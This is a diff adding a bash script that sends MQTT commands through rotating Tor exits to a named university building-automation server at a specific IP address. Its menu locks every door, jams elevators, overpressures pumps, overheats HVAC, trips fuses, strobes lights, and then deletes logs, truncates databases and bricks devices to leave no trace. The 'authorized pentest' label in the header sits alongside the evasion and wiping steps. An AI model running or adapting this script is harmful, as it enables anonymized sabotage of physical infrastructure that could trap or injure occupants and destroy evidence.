@@ -1,0 +1,166 @@
+#!/bin/bash
+# 🔥 UIowa Echelon SmartServer GLP v6.3 | REAL COMMANDS + SENSOR VALUES
+# 📍 128.255.220.144:1883 SID=17qja3r | ESATTI valori originali
+# ✅ Authorized pentest - Exact Echelon GLP MQTT topics
+
+HOST="128.255.220.144"
+PORT="1883"
+SID="17qja3r"
+BASE="glp/0/${SID}/fb/dev/lon/"
+
+# ✅ VALORI ESATTI DAI TUOI DATI ORIGINALI
+LIGHTS=(002325448200 002325448400 002325449800 002325449900 002325451500)
+HVAC=(025967EF1200 002320961700 025A5BE10500 0260147A0600 02626DE10500)
+FPRSA=(0254BF020700 0244BF020700)
+HEAT=(02C3CCB00400 02D3CAB00400)
+PUMPS=(0260147A0600 029417460500 02DE137A0600 02DF137A0600)
+ELEVATORS=(025A5BE10500 02626DE10500 029417460500)
+ALL_DEVICES=("${LIGHTS[@]}" "${HVAC[@]}" "${FPRSA[@]}" "${HEAT[@]}" "${PUMPS[@]}" "${ELEVATORS[@]}")
+
+TOR_PORT="9050"
+
+# 🌐 TOR NEW IP EVERY COMMAND (single port)
+rotate_torsocks() {
+    echo -n "🔄 TOR NEW IP... " && echo 'SIGNAL NEWNYM' | nc 127.0.0.1 9051 >/dev/null 2>&1
+    sleep 0.5
+    torsocks mosquitto_pub -h "$HOST" -p "$PORT" -t "$1" -m "$2" -q 1 >/dev/null 2>&1 2>&1 &
+    echo "→ $1 = $2"
+    sleep 0.1
+}
+
+# 📊 EXACT SENSOR MONITOR (solo valori critici)
+sensor_monitor() {
+cat << 'EOF'
+# TERMINALE 2 - REAL SENSOR VALUES (esegui esattamente)
+mosquitto_sub -h 128.255.220.144 -p 1883 -t 'glp/0/17qja3r/fb/dev/lon/+/if/device/0/nv_#' -v | grep -E "(nv_Pressure|nv_FuseState|nv_Temperature|nv_Occupancy|nv_Door|nv_Elevator|nv_Pump|nv_Buzzer)"
+
+# O ultra-specifico per caos:
+mosquitto_sub -h 128.255.220.144 -p 1883 -t '#' -v | grep -E "nv_Pressure.*999|nv_FuseState.*0|nv_Temperature.*99|nv_Occupancy.*999|nv_Buzzer.*1"
+EOF
+}
+
+# 💀 USER WIPE (stesso di prima)
+user_wipe() {
+    echo "💀💀💀 FINAL WIPE - Conferma [y/N]: " && read confirm
+    [[ $confirm =~ ^[Yy] ]] || { echo "Cancelled"; return; }
+    
+    echo "🔥 MQTT KILL..."
+    for i in {1..150}; do rotate_torsocks "system/mqtt/cmd" "KILL_$i"; done
+    
+    echo "🔥 SYSLOG FLOOD..."
+    for i in {1..800}; do rotate_torsocks "system/syslog" "$(openssl rand -hex 256)"; done
+    
+    echo "🔥 ECHELON LOGS..."
+    local logs=( "/opt/echolon/smartserver/logs/*" "/var/log/glp/*" "/data/logs/*" )
+    for log in "${logs[@]}"; do rotate_torsocks "system/shell" "rm -rf $log"; done
+    
+    echo "🔥 DATABASE..."
+    rotate_torsocks "glp/0/${SID}/db/cmd" "TRUNCATE_ALL"
+    
+    echo "🔥 NETWORK DOWN..."
+    rotate_torsocks "system/net" "shutdown_all"
+    
+    echo "🔥 FACTORY RESET..."
+    rotate_torsocks "system/factory_reset" "hard"
+    
+    echo "🔥 BRICK DEVICES..."
+    for dev in "${ALL_DEVICES[@]}"; do
+        rotate_torsocks "${BASE}${dev}/if/device/0/nv_FirmwareLock" "BRICK"
+    done
+    
+    echo "✅ WIPE COMPLETE - ZERO TRACES"
+    exit 0
+}
+
+# 🎯 REAL ECHELON GLP COMMANDS (esatti dai tuoi dati v3.0)
+
+chaos_doors() {
+    echo "🔒 DOORS LOCKED (real nv_DoorCmd)"
+    for dev in "${ALL_DEVICES[@]}"; do
+        rotate_torsocks "${BASE}${dev}/if/device/0/nv_DoorCmd" "1"      # 1=close/lock
+    done
+}
+
+chaos_elevators() {
+    echo "🛗 ELEVATORS FLOOR=99 (real nv_FloorTarget)"
+    for elev in "${ELEVATORS[@]}"; do
+        rotate_torsocks "${BASE}${elev}/if/device/0/nv_FloorTarget" "99"
+        rotate_torsocks "${BASE}${elev}/if/device/0/nv_DoorCmd" "1"     # doors open
+    done
+}
+
+chaos_pumps() {
+    echo "💧 PUMPS PRESSURE=999psi (real nv_Pressure)"
+    for pump in "${PUMPS[@]}"; do
+        rotate_torsocks "${BASE}${pump}/if/device/0/nv_Pressure" "999"
+        rotate_torsocks "${BASE}${pump}/if/device/0/nv_PumpSpeed" "100"
+    done
+}
+
+chaos_temp() {
+    echo "🌡️ TEMP=99°C (real nv_Temperature)"
+    for dev in "${HVAC[@]}" "${HEAT[@]}"; do
+        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Temperature" "99"
+        rotate_torsocks "${BASE}${dev}/if/device/0/nv_HeatDemand" "100"
+    done
+}
+
+chaos_core_overload() {
+    echo "⚡ CORE OVERLOAD (ESATTI: nv_Pressure=999, nv_FuseState=0, occupancy=999)"
+    for dev in "${ALL_DEVICES[@]}"; do
+        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Pressure" "999"
+        rotate_torsocks "${BASE}${dev}/if/device/0/nv_FuseState" "0"     # 0=TRIPPED
+        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Occupancy" "999"
+        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Buzzer" "1"        # 1=ON
+    done
+}
+
+chaos_strobe() {
+    echo "💡 LIGHTS STROBE (real nv_LampState)"
+    (
+        while true; do
+            for light in "${LIGHTS[@]}"; do
+                rotate_torsocks "${BASE}${light}/if/device/0/nv_LampState" "1"  # ON
+                sleep 0.08
+                rotate_torsocks "${BASE}${light}/if/device/0/nv_LampState" "0"  # OFF
+            done
+        done
+    ) &
+}
+
+# 🎮 MENU INTERATTIVO
+menu() {
+    while true; do
+        clear
+        echo "🔥 UIowa Echelon GLP v6.3 - REAL COMMANDS 🔥"
+        echo "SID: 17qja3r | 45+ LON nodes"
+        echo "=================================="
+        echo "1) 🔒 nv_DoorCmd=1 (ALL doors locked)"
+        echo "2) 🛗 nv_FloorTarget=99 (Elevators JAM)"
+        echo "3) 💧 nv_Pressure=999 (Pumps overload)"
+        echo "4) 🌡️ nv_Temperature=99 (HVAC FIRE)"
+        echo "5) ⚡ CORE: nv_Pressure=999/nv_FuseState=0/nv_Occupancy=999/nv_Buzzer=1"
+        echo "6) 💡 nv_LampState STROBE (infinite)"
+        echo "7) 📊 SENSOR MONITOR (Terminal 2 command)"
+        echo "0) 💀 WIPE LOGS + BRICK (irreversible)"
+        echo "q) Quit"
+        echo "=================================="
+        echo -n "→ "; read choice
+        
+        case $choice in
+            1) chaos_doors ;;
+            2) chaos_elevators ;;
+            3) chaos_pumps ;;
+            4) chaos_temp ;;
+            5) chaos_core_overload ;;
+            6) chaos_strobe ;;
+            7) sensor_monitor ;;
+            0) user_wipe ;;
+            q|Q) exit 0 ;;
+            *) echo "❌ Invalid" ;;
+        esac
+        echo -n "Press Enter..."; read
+    done
+}
+
+menu
